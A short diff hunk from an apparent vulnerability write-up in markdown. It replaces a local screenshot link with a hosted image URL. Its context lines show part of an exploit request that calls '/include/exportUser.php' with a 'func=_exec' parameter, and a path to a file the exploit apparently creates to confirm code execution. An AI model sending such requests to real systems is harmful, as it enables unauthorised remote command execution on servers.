@@ -64,4 +64,4 @@ http://xxx.xxx.xxx.xxx/include/exportUser.php?type=3&cla=application&func=_exec&
 http://xxx.xxx.xxx.xxx/include/pq.txt
 ````
 
-![](image/tm-9.png)
+![](http://wikioss.peiqi.tech/vuln/tm-9.png)
